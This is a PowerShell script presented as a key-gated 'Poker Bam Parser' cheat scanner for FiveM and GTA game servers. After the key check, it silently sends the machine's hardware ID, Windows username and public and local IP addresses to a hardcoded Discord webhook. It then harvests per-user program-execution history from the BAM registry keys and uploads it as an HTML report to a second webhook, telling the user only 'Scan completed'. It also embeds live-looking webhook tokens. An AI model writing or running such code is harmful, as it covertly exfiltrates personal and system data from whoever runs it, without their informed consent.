
param()

# ---------------- Keys (plain, 5-char strings) ----------------
$KeysPlain = @(
    "A1B2C","D3E4F","G5H6I","J7K8L","M9N0O",
    "P1Q2R","S3T4U","V5W6X","Y7Z8A","B9C0D",
    "E1F2G","H3I4J","K5L6M","N7O8P","Q9R0S",
    "T1U2V","W3X4Y","Z5A6B","C7D8E","F9G0H",
    "I1J2K","L3M4N","O5P6Q","R7S8T","U9V0W",
    "X1Y2Z","A3B4C","D5E6F","G7H8I","J9K0L"
)

# file to store used keys (one-time)
$UsedKeysFile = "$env:TEMP\poker_used_keys.json"
if (Test-Path $UsedKeysFile) {
    try { $UsedKeys = Get-Content -Raw $UsedKeysFile | ConvertFrom-Json } catch { $UsedKeys = @() }
} else { $UsedKeys = @() }

# ---------------- Masked input function (shows '*' while typing) ----------------
function Read-KeyMasked {
    param([string]$Prompt = "Enter key")

    Write-Host -NoNewline ("{0}: " -f $Prompt)

    $sb = New-Object System.Text.StringBuilder
    while ($true) {
        $key = [System.Console]::ReadKey($true)
        if ($key.Key -eq 'Enter') {
            break
        } elseif ($key.Key -eq 'Backspace') {
            if ($sb.Length -gt 0) {
                $sb.Length = $sb.Length - 1
                [System.Console]::Write("`b `b")
            }
        } elseif ($key.KeyChar) {
            $ch = $key.KeyChar
            if (-not [char]::IsControl($ch)) {
                $sb.Append($ch) | Out-Null
                [System.Console]::Write("*")
            }
        }
    }
    [System.Console]::WriteLine()
    return $sb.ToString()
}

# ---------------- Helper: HWID and Windows user ----------------
function Get-HWID {
    try {
        $bios = Get-CimInstance -ClassName Win32_BIOS -ErrorAction Stop
        $cs   = Get-CimInstance -ClassName Win32_ComputerSystemProduct -ErrorAction Stop
        return ($cs.UUID + "|" + $bios.SerialNumber).ToUpper()
    } catch { return $env:COMPUTERNAME.ToUpper() }
}
function Get-WindowsUser {
    try {
        $wi = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        return $wi.Name
    } catch {
        return $env:USERNAME
    }
}

# ---------------- Key check (plain 1-time) ----------------
$userKey = Read-KeyMasked -Prompt "Enter your Poker key"
if (-not $userKey -or $userKey.Trim().Length -eq 0) {
    Write-Host "No key provided. Exiting." -ForegroundColor Red
    Start-Sleep 1
    Exit 1
}

# Normalize keys (case-insensitive)
$userKeyNormalized = $userKey.Trim().ToUpper()
$valid = $false
foreach ($k in $KeysPlain) {
    if ($k.ToUpper() -eq $userKeyNormalized) {
        if ($UsedKeys -contains $userKeyNormalized) {
            $valid = $false
            break
        }
        $valid = $true
        break
    }
}

if (-not $valid) {
    Write-Host "Invalid or already used key. Exiting." -ForegroundColor Red
    Start-Sleep 2
    Exit 1
}

# mark key as used (store normalized form)
$UsedKeys += $userKeyNormalized
$UsedKeys | ConvertTo-Json | Set-Content -Path $UsedKeysFile -Force

# ---------------- Send basic info to admin webhook (with IPs, no VPN-bypass) ----------------
$AdminWebhookUrl = "https://discord.com/api/webhooks/1421664709928550412/g2TX82xO9uL6s3Bo89_4y9Mcz-2okoQWBHiCbTs1ZqeZ6W_hGyQjSVxkfuJVAfLeSllf"

function Get-ExternalIp {
    try {
        # api.ipify.org returns plain text IP; fallback to ifconfig.co if needed
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=text' -TimeoutSec 6 -ErrorAction Stop).Trim()
        if ($ip) { return $ip }
    } catch {}
    try {
        $ip = (Invoke-RestMethod -Uri 'https://ifconfig.co/ip' -TimeoutSec 6 -ErrorAction Stop).Trim()
        if ($ip) { return $ip }
    } catch {}
    return $null
}

function Get-LocalIPs {
    try {
        # For PS5.1 use Get-NetIPAddress if available, else fallback to .NET
        if (Get-Command -Name Get-NetIPAddress -ErrorAction SilentlyContinue) {
            $ips = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                   Where-Object { $_.IPAddress -and ($_.IPAddress -notlike '169.254.*') } |
                   Select-Object -ExpandProperty IPAddress
            return ($ips -join ", ")
        } else {
            $hosts = [System.Net.Dns]::GetHostEntry([System.Net.Dns]::GetHostName()).AddressList |
                     Where-Object { $_.AddressFamily -eq 'InterNetwork' } | ForEach-Object { $_.ToString() }
            return ($hosts -join ", ")
        }
    } catch { return $null }
}

try {
    $hwid = Get-HWID
    $winuser = Get-WindowsUser
    $ts = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssK")
    $externalIp = Get-ExternalIp
    $localIps = Get-LocalIPs

    $lines = @()
    $lines += "HWID: $hwid"
    $lines += "Windows User: $winuser"
    $lines += "Timestamp: $ts"
    if ($externalIp) { $lines += "Public IP (seen by internet): $externalIp" } else { $lines += "Public IP: unavailable" }
    if ($localIps) { $lines += "Local IPs: $localIps" }

    $content = $lines -join "`n"
    $payload = @{ content = $content } | ConvertTo-Json -Depth 3
    Invoke-RestMethod -Uri $AdminWebhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop | Out-Null
} catch {
    # ignore failures silently
}


# ---------------- Silent scan + Discord upload ----------------
$KnownGtaExeNames = @("FiveM.exe","ragemp.exe","gta5.exe","FiveM_GTAProcess.exe")
$KnownGtaPathsPatterns = @("FiveM","ragemp","CitizenFX")

$SigCache = @{}
function Get-Signature-Cached { param($FilePath)
    if (-not (Test-Path $FilePath -PathType Leaf)) { return [PSCustomObject]@{ Status="FileNotFound"; Publisher=$null } }
    if ($SigCache.ContainsKey($FilePath)) { return $SigCache[$FilePath] }
    try { $sig = Get-AuthenticodeSignature -FilePath $FilePath -ErrorAction Stop
          $obj = [PSCustomObject]@{ Status=$sig.Status.ToString(); Publisher = if ($sig.SignerCertificate) { $sig.SignerCertificate.Subject } else { $null } }
    } catch { $obj = [PSCustomObject]@{ Status="UnknownError"; Publisher=$null } }
    $SigCache[$FilePath] = $obj; return $obj
}
function Get-FileHash-Safe($FilePath){ try { (Get-FileHash -Path $FilePath -Algorithm SHA256 -ErrorAction Stop).Hash } catch { $null } }
function Get-RiskScore { param($e); $s=0; if ($e.SignatureStatus -ne "Valid"){$s+=2}; if (-not $e.SHA256){$s+=1}; if ($e.LikelyGTAProcess){$s+=2}; if ($e.ProcessRunning){$s+=1}; $s }

$rpath = @("HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings","HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings")
$Users = @()
foreach ($p in $rpath) { if (Test-Path $p) { $Users += Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -ExpandProperty PSChildName } }
$Users = $Users | Sort-Object -Unique

$allResults = @()
foreach ($sid in $Users) {
    foreach ($rp in $rpath) {
        $regUserPath = "$rp\$sid"
        if (-not (Test-Path $regUserPath)) { continue }
        $props = (Get-Item $regUserPath).Property
        $UserName = try { (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value } catch { $sid }
        foreach ($Item in $props) {
            $raw = (Get-ItemProperty $regUserPath -ErrorAction SilentlyContinue).$Item
            if (-not $raw -or $raw.Length -lt 8) { continue }
            try { $ticks=[BitConverter]::ToInt64($raw,0); $dtUtc=[DateTime]::FromFileTimeUtc($ticks) } catch { continue }
            $f = Split-Path -Leaf $Item
            $sig = Get-Signature-Cached $Item
            $sha = Get-FileHash-Safe $Item
            $isGta = ($KnownGtaExeNames -contains $f) -or ($KnownGtaPathsPatterns | ForEach-Object { $Item -match $_ })
            $procRunning = try { (Get-Process -Name ([IO.Path]::GetFileNameWithoutExtension($f)) -ErrorAction SilentlyContinue) } catch { $null }
            $procRunning = [bool]$procRunning
            $obj = [PSCustomObject]@{
                Application = $f; Path = $Item; User = $UserName;
                "Last Execution (UTC)" = $dtUtc.ToString("yyyy-MM-dd HH:mm:ss");
                SignatureStatus = $sig.Status; Publisher = $sig.Publisher; SHA256 = $sha;
                LikelyGTAProcess = $isGta; ProcessRunning = $procRunning
            }
            $obj | Add-Member -NotePropertyName RiskScore -NotePropertyValue (Get-RiskScore $obj)
            $allResults += $obj
        }
    }
}

# create temp HTML report
$tempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "PokerBamParser_" + [Guid]::NewGuid().ToString() + ".html")
$rows = foreach ($r in $allResults) {
    $cls = if ($r.SignatureStatus -eq "Valid"){"style='color:lime;'"} elseif ($r.SignatureStatus -eq "NotSigned"){"style='color:red;'"} else {"style='color:orange;'"}
    "<tr><td>$($r.Application)</td><td>$($r.Path)</td><td>$($r.User)</td><td>$($r.'Last Execution (UTC)')</td><td $cls>$($r.SignatureStatus)</td><td>$($r.RiskScore)</td></tr>"
}
$html = @"
<html><head><meta charset='utf-8'><style>body{background:#121212;color:#eee;font-family:Arial;}table{border-collapse:collapse;width:100%;}th,td{border:1px solid #444;padding:5px;}th{background:#333;}</style></head><body><h2>Poker Bam Parser - Cheating Tool</h2><table><tr><th>Application</th><th>Path</th><th>User</th><th>Last Execution (UTC)</th><th>Signature</th><th>Risk</th></tr>
$($rows -join "`n")
</table></body></html>
"@
Set-Content -Path $tempFile -Value $html -Encoding UTF8

# upload via webhook
$DiscordWebhookUrl = "https://discord.com/api/webhooks/1421652100462678118/PmVEyTbvzmlL_f50eKZ0ef_tCKsJ9lGCtFAQAwzINA1d1hCmV_z8D1rBeKzrXcB_XzW2"
if (Test-Path $tempFile -PathType Leaf) {
    try {
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        $fileBytes = [System.IO.File]::ReadAllBytes($tempFile)
        $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
        $fileEncoded = $enc.GetString($fileBytes)
        $bodyLines = @()
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"content`"$LF"
        $bodyLines += "Poker Bam Parser - raport generat ($(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))$LF"
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"username`"$LF"
        $bodyLines += "Poker Bam Parser$LF"
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $tempFile -Leaf)`"" 
        $bodyLines += "Content-Type: text/html$LF"
        $bodyLines += $fileEncoded
        $bodyLines += "--$boundary--$LF"
        $body = ($bodyLines -join $LF)
        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body -ErrorAction Stop | Out-Null
    } catch { ; }
}

# cleanup
Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
Write-Host "Scan completed"
